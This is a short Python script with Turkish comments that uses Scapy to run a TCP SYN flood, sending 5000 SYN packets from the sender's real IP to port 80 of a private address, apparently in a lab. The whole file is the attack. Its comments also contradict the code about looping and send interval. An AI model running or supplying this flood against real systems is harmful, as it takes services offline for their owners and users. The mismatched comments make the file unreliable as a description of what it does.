# non_spoofed_syn.py
from scapy.all import *

target_ip = "10.0.5.11"
target_port = 80
count = 5000

print(f"Gercek IP ile SYN Flood baslatiliyor: {target_ip}")

# Kendi IP'mizi kullandigimiz icin Ether() icine dst yazmamiz 
# ve IP() icine src yazmamiz sart degil, Scapy halleder.
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(dst=target_ip) / TCP(dport=target_port, flags="S")

# 'loop=1' ile durdurana kadar sonsuz paket gonderir
# 'inter=0.0001' ile olabildigince hizli gonderir
sendp(pkt, count=count, inter=0.01, verbose=0)